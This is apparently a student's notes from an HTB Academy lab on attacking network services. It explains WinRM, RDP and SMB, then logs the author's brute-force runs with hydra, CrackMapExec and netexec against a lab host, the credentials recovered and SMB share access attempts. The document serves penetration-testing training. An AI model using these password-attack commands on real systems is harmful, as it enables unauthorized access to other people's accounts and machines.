

During our penetration tests, every computer network we encounter will have services installed to manage, edit or create content. All of these services are hosted using specific permissions and are assigned to specific users. Apart from web applications these services include

|   |   |   |
|---|---|---|
|FTP|SMB|NFS|
|IMAP/POP3|SSH|MySQL/MSSQL|
|RDP|WinRM|VNC|
|Telnet|SMTP|LDAP|
For further reading on many of these services, check out the [Footprinting](https://academy.hackthebox.com/course/preview/footprinting) module on HTB Academy.




## WinRM
Window Remote Management (WinRM) is the Microsoft implementation of the network protocol Web Services Management protocol (WS-Management). Which is a network protocol based on XML web services using the Simple Object Access Protocol (SOAP) for remote management of windows systems. It takes care of the communication between[Web-Based Enterprise Management](https://en.wikipedia.org/wiki/Web-Based_Enterprise_Management) (`WBEM`)) and the[Windows Management Instrumentation](https://docs.microsoft.com/en-us/windows/win32/wmisdk/wmi-start-page) (`WMI`), which can call the [Distributed Component Object Model](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-dcom/4a893f3d-bd29-48cd-9f43-d9777a4415b0) (`DCOM`).


However for security reason WinRM must be activate and configured manually in windows 10. Therefore it depends heavily on the environment security in a domain or local network where we want to use WinRM. In Most cases one uses certificates or only specific authentication mechanisms to increase its security. WinRM uses the TCP ports `5985` (`HTTP`) and `5986` (`HTTPS`).

A handy tool that we can use for our password attacks is [CrackMapExec](https://github.com/byt3bl33d3r/CrackMapExec), which can also be used for other protocols such as SMB, LDAP, MSSQL, and others. We recommend reading the [official documentation](https://web.archive.org/web/20231116172005/https://www.crackmapexec.wiki/) for this tool to become familiar with it.

PORT 5985 is a WinRM port even though it says HTTPAPI



#### CrackMapExec Usage

The general format for using CrackMapExec is as follows:

Network Services

```shell-session
JackTheWizard@htb[/htb]$ crackmapexec <proto> <target-IP> -u <user or userlist> -p <password or passwordlist>
```

Network Services

```shell-session
JackTheWizard@htb[/htb]$ crackmapexec winrm 10.129.42.197 -u user.list -p password.list

WINRM       10.129.42.197   5985   NONE             [*] None (name:10.129.42.197) (domain:None)
WINRM       10.129.42.197   5985   NONE             [*] http://10.129.42.197:5985/wsman
WINRM       10.129.42.197   5985   NONE             [+] None\user:password (Pwn3d!)
```

The appearance of `(Pwn3d!)` is the sign that we can most likely execute system commands if we log in with the brute-forced user. Another handy tool that we can use to communicate with the WinRM service is [Evil-WinRM](https://github.com/Hackplayers/evil-winrm), which allows us to communicate with the WinRM service efficiently.


You can use 
`use auxiliary/scanner/winrm/winrm_login` 

To bruteforce the login in metasploit


#### Evil-WinRM

#### Installing Evil-WinRM

Network Services

```shell-session
JackTheWizard@htb[/htb]$ sudo gem install evil-winrm

Fetching little-plugger-1.1.4.gem
Fetching rubyntlm-0.6.3.gem
Fetching builder-3.2.4.gem
Fetching logging-2.3.0.gem
Fetching gyoku-1.3.1.gem
Fetching nori-2.6.0.gem
Fetching gssapi-1.3.1.gem
Fetching erubi-1.10.0.gem
Fetching evil-winrm-3.3.gem
Fetching winrm-2.3.6.gem
Fetching winrm-fs-1.3.5.gem
Happy hacking! :)
```

#### Evil-WinRM Usage

Network Services

```shell-session
JackTheWizard@htb[/htb]$ evil-winrm -i <target-IP> -u <username> -p <password>
```





## Remote Desktop Protocol (RDP)

Microsoft's [Remote Desktop Protocol](https://docs.microsoft.com/en-us/troubleshoot/windows-server/remote/understanding-remote-desktop-protocol) (`RDP`) is a network protocol that allows remote access to Windows systems via `TCP port 3389` by default. RDP provides both users and administrators/support staff with remote access to Windows hosts within an organization. The Remote Desktop Protocol defines two participants for a connection: a so-called terminal server, on which the actual work takes place, and a terminal client, via which the terminal server is remotely controlled. In addition to the exchange of image, sound, keyboard, and pointing device, the RDP can also print documents of the terminal server on a printer connected to the terminal client or allow access to storage media available there. Technically, the RDP is an application layer protocol in the IP stack and can use TCP and UDP for data transmission. The protocol is used by various official Microsoft apps, but it is also used in some third-party solutions.



#### xFreeRDP

Network Services

```shell-session
JackTheWizard@htb[/htb]$ xfreerdp /v:<target-IP> /u:<username> /p:<password>
```




## SMB

Server Message Block (SMB) is a protocol responsible for transferring data between a client and a server in Local Area Networks. It is used to implement file and directory sharing most NAS's use SMB to let you access stuff. Whenever you see \\*IP*\shared you can see its SMB

Windows can also use NFS which is a seperate protocol
SMB can be compared to `NFS` for Unix and Linux for providing drives on local networks.

SMB is also known as [Common Internet File System](https://cifs.com/) (`CIFS`). It is part of the SMB protocol and enables universal remote connection of multiple platforms such as Windows, Linux, or macOS. In addition, we will often encounter [Samba](https://wiki.samba.org/index.php/Main_Page), which is an open-source implementation of the above functions. For SMB, we can also use `hydra` again to try different usernames in combination with different passwords.


We can use metasploit module

```shell-session
auxiliary/scanner/smb/smb_login
``` 

to bruteforce login

I download the username.list and password.list

nxc winrm 10.129.81.110 -u usernames.list -p passwords.list


I used netexec and got the user john

Bruteforce winrm
nxc winrm 10.129.81.110 -u usernames.list -p passwords.list


Bruteforce ssh 

hydra -L username.list -P password.list ssh://10.129.81.110

22][ssh] host: 10.129.81.110   login: dennis   password: rockstar


We also use Hydra to bruteforce RDP


hydra -L username.list -P password.list rdp://10.129.81.110 


[3389][rdp] host: 10.129.81.110   login: chris   password: 789456123


then use xfreerdp to login 

xfreerdp /v:10.129.81.110 /u:chris /p:789456123


To bruteforce SMB i just use

nxc smb 10.129.81.110 -u username.list -p password.list


Bruteforce ssh 

hydra -L username.list -P password.list ssh://10.129.81.110
Bruteforce winrm
nxc winrm 10.129.81.110 -u usernames.list -p passwords.list

Bruteforce RDP:
hydra -L username.list -P password.list rdp://10.129.81.110 


BruteForce SMB:
nxc smb 10.129.81.110 -u username.list -p password.list


john:november
https://www.netexec.wiki/smb-protocol/scan-for-vulnerabilities


I check shares with 

nxc smb 10.129.81.110 -u John -p 'november' --shares

Then this smbclient command worked for me

smbclient //10.129.81.110/CASSIE -U John%november


Since the john user wasnt showing anything and I saw the CASSIE share in here I just bruteforced cassie s password


haxor@skid pen]$ smbclient -U John \\\\10.129.81.110\\C$
Can't load /etc/samba/smb.conf - run testparm to debug it
Password for [WORKGROUP\John]:
tree connect failed: NT_STATUS_ACCESS_DENIED
[haxor@skid pen]$ smbclient //10.129.81.110/CASSIE -U John%november
Can't load /etc/samba/smb.conf - run testparm to debug it
Try "help" to get a list of possible commands.
smb: \> dir
NT_STATUS_ACCESS_DENIED listing \*
smb: \> get flag.txt
NT_STATUS_ACCESS_DENIED opening remote file \flag.txt
smb: \>